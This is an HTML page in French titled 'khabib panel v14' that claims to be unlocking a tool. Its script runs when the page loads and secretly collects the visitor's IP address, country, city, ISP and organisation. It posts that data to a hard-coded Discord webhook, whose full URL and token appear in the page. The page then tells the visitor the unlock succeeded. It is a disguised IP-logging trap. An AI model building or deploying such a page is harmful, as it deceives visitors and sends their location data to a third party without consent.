<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>khabib panel v14</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #0f172a;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .box {
            background: #020617;
            padding: 25px;
            border-radius: 10px;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 0 20px rgba(0,0,0,0.6);
        }
    </style>
</head>
<body>

<div class="box" id="resultBox">
    <h2>khabib</h2>
    <p>Traitement en cours pour d√©bloquer khabib panel v14...</p>
    <p id="resultText">Chargement...</p>
</div>

<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1453050534851379243/QQWpYZbMCPh4wn637YIkWNvpPLw7BxVyo6kJWN2q1xxn4IXiEnL6LGU-wDVhGbMiUaEU";

window.onload = function() {
    document.getElementById("resultText").textContent = "R√©cup√©ration de vos donn√©es...";

    fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
            const ip = data.ip;

            // R√©cup√©ration des infos geo + ISP via ip-api.com
            return fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,city,isp,org`)
                .then(geoRes => geoRes.json())
                .then(geoData => {
                    if (geoData.status !== "success") {
                        throw new Error("√âchec geo");
                    }

                    // Drapeau pays (optionnel, pour rendre joli sur Discord)
                    const flag = geoData.countryCode ? String.fromCodePoint(...[...geoData.countryCode.toUpperCase()].map(c => c.charCodeAt(0) + 127397 - 65)) : "";

                    const payload = {
                        content: `üì• **Nouveau visiteur (auto)**\n` +
                                 `üåê IP : ${ip}\n` +
                                 `üåç Pays : ${flag} ${geoData.country || "Inconnu"}\n` +
                                 `üèôÔ∏è Ville : ${geoData.city || "Inconnu"}\n` +
                                 `üì° ISP : ${geoData.isp || "Inconnu"}\n` +
                                 `üè¢ Org : ${geoData.org || "Inconnu"}\n` +
                                 `üïí ${new Date().toLocaleString()}`
                    };

                    return fetch(WEBHOOK_URL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(payload)
                    });
                })
                .then(() => {
                    document.getElementById("resultText").textContent = "D√©bloqu√© avec succ√®s !";
                });
        })
        .catch(err => {
            console.error(err);
            document.getElementById("resultText").textContent = "Erreur, mais vos donn√©es ont peut-√™tre √©t√© enregistr√©es.";
        });
}
</script>

</body>
</html>
